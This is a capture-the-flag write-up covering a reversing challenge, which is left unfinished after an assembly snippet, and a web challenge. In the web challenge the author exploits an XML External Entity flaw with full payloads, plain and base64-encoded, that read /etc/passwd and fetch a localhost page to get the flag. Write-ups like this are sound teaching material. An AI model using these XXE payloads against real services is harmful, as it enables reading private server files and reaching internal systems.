# Sunshine CTF

## Challenge #1: Patches Punches (reversing)

This challenge was a reversing challenge. The hint presented was: 

```
That moment when you go for a body slam and you realize you *jump* too far. Adjust your aim, and you'll crush this challenge!
```

So immediately, I knew that the challenge has something to do with jumps. The first step I took was executing the binary. The program outputed a single line with no means of input.

```bash
$ ./patches
$ Woah there! you jumped over the flag.
```

Upon openning the binary in Binary Ninja, I inspected the code initally to find where the program prints its flag and at what point it branches away from normal execution and prints the previous output. The following portion of the assembly 

```x86
00000534  05a41a0000         add     eax, 0x1aa4  {_GLOBAL_OFFSET_TABLE_}
00000539  c745f001000000     mov     dword [ebp-0x10 {var_18}], 0x1
00000540  837df000           cmp     dword [ebp-0x10 {var_18}], 0x0
00000544  755d               jne     0x5a3  {0x1}
```

## Challenge #2: Wrestler Name Generator (web)

This challenge presented a website which, upon entering the first and last name and choosing a weapon of choice, would generate a wrestler name. The landing page looks like this:
tput.
![Screenshot](/ctf/images/pic1.png?raw=true)

**Screenshot of the main landing page**

![Screenshot](/ctf/images/pic2.png?raw=true)

**Screenshot of the result page**

The first step I took was to look at the page source, and I found the javascript at the bottom of the page (included below). I noticed that the main purpose of the JS is to pass the entered first and last name as an XML object, encoded as base-64 and made safe for URL as a GET parameter to the page /generate.php?input=XMLSTRING.

```javascript
document.getElementById("button").onclick = function() {
  var firstName = document.getElementById("firstName").value;
  var lastName = document.getElementById("lastName").value;
  var input = btoa("<?xml version='1.0' encoding='UTF-8'?><input><firstName>" + firstName + "</firstName><lastName>" + lastName+ "</lastName></input>");
  window.location.href = "/generate.php?input="+encodeURIComponent(input);
};
```

Similarly, examining the source code of the result page (second screenshot) yielded this interesting comment: 

```
<!--hacker name functionality coming soon!-->
<!--if you're trying to test the hacker name functionality, make sure you're accessing this page from the web server-->
<!--<h2>Your Hacker Name Is: REDACTED</h2>-->
```

Immediately, I thought about exploiting the common XXE (XML External Entity) vulnerability. Rather than entering the XML exploit into the input element of the website, I tried passing the XML string drectly into the URL `http://ng.sunshinectf.org/generate.php?input=[XML]`.

The XML object format was this:

```xml
<?xml version='1.0' encoding='UTF-8'?>
<input>
  <firstName>firstName</firstName>
  <lastName>lastName</lastName>
</input>
```

Encoded into a URL safe base-64 string, this XML object became this: `PD94bWwgdmVyc2lvbj0nMS4wJyBlbmNvZGluZz0nVVRGLTgnPz4KPGlucHV0PgogIDxmaXJzdE5hbWU%2BZmlyc3ROYW1lPC9maXJzdE5hbWU%2BCiAgPGxhc3ROYW1lPmxhc3ROYW1lPC9sYXN0TmFtZT4KPC9pbnB1dD4%3D` passing that string to the generate.php page as the input parameter successfully rendered the page.

I then tried to pass an XML entity exploit to see if it would yield a result. So, I tried accessing `/etc/passwd`. I used the following XML code:

```xml
<?xml version='1.0' encoding='UTF-8'?>
<!DOCTYPE ernw [ <!ENTITY xxe SYSTEM "file:///etc/passwd" > ]>
<input>
  <firstName>Kim</firstName>
  <lastName>&xxe;</lastName>
</input>
```

Which encoded and made URL safe yielded the string: `PD94bWwgdmVyc2lvbj0nMS4wJyBlbmNvZGluZz0nVVRGLTgnPz4KPCFET0NUWtionVBFIGVybncgWyA8IUVOVElUWSB4eGUgU1lTVEVNICJmaWxlOi8vL2V0Yy9wYXNzd2QiID4gXT4KPGlucHV0PgogIDxmaXJzdE5hbWU%2BS2ltPC9maXJzdE5hbWU%2BCiAgPGxhc3ROYW1lPiZ4eGU7PC9sYXN0TmFtZT4KPC9pbnB1dD4%3D`. This string, entered into the URL parameter yielded the following result page.

![Screenshot](/ctf/images/pic4.png?raw=true)

This is promising! It shows the contents of `/etc/passwd`. So let;s try to figure out how to get the actual flag. I thought that it might have to do with the aoffrementioned comment on the /generate.php page (that the page needs to be accessed from the webserver to see the secret Hacker Name). So I tried to use the XML function to access a remote host's page by replacing `file:///etc/passwd` with `http://localhost/generate.php`. The final XML string passed was:


```xml
<?xml version='1.0' encoding='UTF-8'?>
<!DOCTYPE ernw [ <!ENTITY xxe SYSTEM "http://localhost/generate.php" > ]>
<input>
  <firstName>Kim</firstName>
  <lastName>&xxe;</lastName>
</input>
```

Whhich was translated into this string: `PD94bWwgdmVyc2lvbj0nMS4wJyBlbmNvZGluZz0nVVRGLTgnPz48IURPQ1RZUEUgZXJudyBbIDwhRU5USVRZIHh4ZSBTWVNURU0gImh0dHA6Ly9sb2NhbGhvc3QvZ2VuZXJhdGUucGhwIiA%2BIF0%2BPGlucHV0PjxmaXJzdE5hbWU%2BS2ltPC9maXJzdE5hbWU%2BPGxhc3ROYW1lPiZ4eGU7PC9sYXN0TmFtZT48L2lucHV0Pg%3D%3D`, which passed to the /generate.php page yielded the flag:

![Screenshot](/ctf/images/pic5.png?raw=true)
